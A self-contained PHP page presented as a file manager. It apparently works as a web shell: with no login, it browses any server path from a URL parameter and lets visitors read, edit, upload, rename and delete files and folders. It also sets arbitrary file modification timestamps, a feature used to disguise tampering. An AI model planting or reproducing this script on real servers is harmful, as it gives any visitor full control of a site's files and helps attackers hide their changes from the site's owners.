<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

class FileManager {
    private string $currentPath;

    public function __construct(?string $path = null) {
        $this->currentPath = ($path && is_dir($path)) ? realpath($path) : getcwd();
    }

    public function getPath(): string {
        return $this->currentPath;
    }

    public function listItems(): array {
        try {
            $files = @scandir($this->currentPath);
            if ($files === false) return [];
            return array_values(array_diff($files, ['.', '..']));
        } catch (Throwable $e) {
            return [];
        }
    }

    public function createDir(string $name): bool {
        $path = $this->currentPath . DIRECTORY_SEPARATOR . $name;
        return !file_exists($path) ? mkdir($path, 0777, true) : false;
    }

    public function createFile(string $name, string $content = ''): bool {
        $path = $this->currentPath . DIRECTORY_SEPARATOR . $name;
        return file_put_contents($path, $content) !== false;
    }

    public function delete(string $name): bool {
        $path = $this->currentPath . DIRECTORY_SEPARATOR . $name;
        if (is_dir($path)) return $this->deleteDir($path);
        if (is_file($path)) return unlink($path);
        return false;
    }

    private function deleteDir(string $dir): bool {
        foreach (array_diff(scandir($dir), ['.', '..']) as $file) {
            $path = "$dir/$file";
            if (is_dir($path)) $this->deleteDir($path);
            else unlink($path);
        }
        return rmdir($dir);
    }

    public function rename(string $old, string $new): bool {
        $oldPath = $this->currentPath . DIRECTORY_SEPARATOR . $old;
        $newPath = $this->currentPath . DIRECTORY_SEPARATOR . $new;
        return file_exists($oldPath) ? rename($oldPath, $newPath) : false;
    }

    public function upload(array $file): bool {
        if (isset($file['tmp_name']) && is_uploaded_file($file['tmp_name'])) {
            $target = $this->currentPath . DIRECTORY_SEPARATOR . basename($file['name']);
            return move_uploaded_file($file['tmp_name'], $target);
        }
        return false;
    }

    // 🕒 Set custom timestamp (touch)
    public function setTimestamp(string $name, ?string $timestamp = null): bool {
        $path = $this->currentPath . DIRECTORY_SEPARATOR . $name;
        if (!file_exists($path)) return false;
        $time = $timestamp ? strtotime($timestamp) : time();
        if ($time === false) return false;
        return touch($path, $time);
    }

    // 📝 Get file content
    public function getFileContent(string $name): ?string {
        $path = $this->currentPath . DIRECTORY_SEPARATOR . $name;
        return (is_file($path) && is_readable($path)) ? file_get_contents($path) : null;
    }

    // 💾 Save edited content
    public function saveFileContent(string $name, string $content): bool {
        $path = $this->currentPath . DIRECTORY_SEPARATOR . $name;
        return (is_file($path) && is_writable($path)) ? file_put_contents($path, $content) !== false : false;
    }
}

// === Runtime Handler ===
$path = $_GET['path'] ?? getcwd();
$fm = new FileManager($path);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_FILES['upload'])) $fm->upload($_FILES['upload']);
    if (!empty($_POST['newdir'])) $fm->createDir($_POST['newdir']);
    if (!empty($_POST['newfile'])) $fm->createFile($_POST['newfile']);
    if (!empty($_POST['delete'])) $fm->delete($_POST['delete']);
    if (!empty($_POST['rename_from']) && !empty($_POST['rename_to'])) $fm->rename($_POST['rename_from'], $_POST['rename_to']);
    if (!empty($_POST['touch_name']) && !empty($_POST['touch_time'])) $fm->setTimestamp($_POST['touch_name'], $_POST['touch_time']);
    if (!empty($_POST['edit_name']) && isset($_POST['edit_content'])) $fm->saveFileContent($_POST['edit_name'], $_POST['edit_content']);

    header("Location: ?path=" . urlencode($fm->getPath()));
    exit;
}

$items = $fm->listItems();
$current = $fm->getPath();
$parent = dirname($current);

// === File Editor Popup ===
$editFile = $_GET['edit'] ?? null;
$fileContent = $editFile ? $fm->getFileContent($editFile) : null;
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>PHP File Manager (with Edit & Touch)</title>
<style>
body { font-family: Arial, sans-serif; margin: 20px; background: #f4f4f4; }
a { color: #0077cc; text-decoration: none; }
.container { background: #fff; padding: 20px; border-radius: 8px; }
input, button, textarea { padding: 5px 10px; margin: 4px; }
table { width: 100%; border-collapse: collapse; margin-top: 10px; }
th, td { padding: 8px; border-bottom: 1px solid #ccc; }
textarea { width: 100%; height: 400px; font-family: monospace; }
.editor { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.2); }
</style>
</head>
<body>
<div class="container">
    <h2>📁 Current Directory: <?= htmlspecialchars($current) ?></h2>

    <?php if ($current !== $parent): ?>
        <a href="?path=<?= urlencode($parent) ?>">⬅ Go Up</a>
    <?php endif; ?>

    <table>
        <tr><th>Name</th><th>Type</th><th>Modified</th><th>Action</th></tr>
        <?php foreach ($items as $item): 
            $full = $current . DIRECTORY_SEPARATOR . $item;
            $mtime = filemtime($full);
        ?>
        <tr>
            <td>
                <?php if (is_dir($full)): ?>
                    📂 <a href="?path=<?= urlencode($full) ?>"><?= htmlspecialchars($item) ?></a>
                <?php else: ?>
                    📄 <?= htmlspecialchars($item) ?>
                <?php endif; ?>
            </td>
            <td><?= is_dir($full) ? 'Folder' : 'File' ?></td>
            <td><?= date('Y-m-d H:i:s', $mtime) ?></td>
            <td>
                <?php if (!is_dir($full)): ?>
                    <a href="?path=<?= urlencode($current) ?>&edit=<?= urlencode($item) ?>">✏ Edit</a>
                <?php endif; ?>

                <form method="post" style="display:inline">
                    <input type="hidden" name="delete" value="<?= htmlspecialchars($item) ?>">
                    <button type="submit" onclick="return confirm('Delete <?= htmlspecialchars($item) ?>?')">🗑</button>
                </form>

                <form method="post" style="display:inline">
                    <input type="hidden" name="rename_from" value="<?= htmlspecialchars($item) ?>">
                    <input type="text" name="rename_to" placeholder="New name">
                    <button type="submit">✏</button>
                </form>

                <form method="post" style="display:inline">
                    <input type="hidden" name="touch_name" value="<?= htmlspecialchars($item) ?>">
                    <input type="text" name="touch_time" placeholder="YYYY-MM-DD HH:MM:SS">
                    <button type="submit">🕒</button>
                </form>
            </td>
        </tr>
        <?php endforeach; ?>
    </table>

    <hr>
    <h3>+ Add New</h3>
    <form method="post">
        <input type="text" name="newdir" placeholder="New Folder Name">
        <button type="submit">Create Folder</button>
    </form>
    <form method="post">
        <input type="text" name="newfile" placeholder="New File Name">
        <button type="submit">Create File</button>
    </form>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="upload">
        <button type="submit">Upload File</button>
    </form>
</div>

<?php if ($editFile && $fileContent !== null): ?>
<div class="editor">
    <h3>Editing: <?= htmlspecialchars($editFile) ?></h3>
    <form method="post">
        <input type="hidden" name="edit_name" value="<?= htmlspecialchars($editFile) ?>">
        <textarea name="edit_content"><?= htmlspecialchars($fileContent) ?></textarea><br>
        <button type="submit">💾 Save</button>
        <a href="?path=<?= urlencode($current) ?>">Cancel</a>
    </form>
</div>
<?php endif; ?>
</body>
</html>
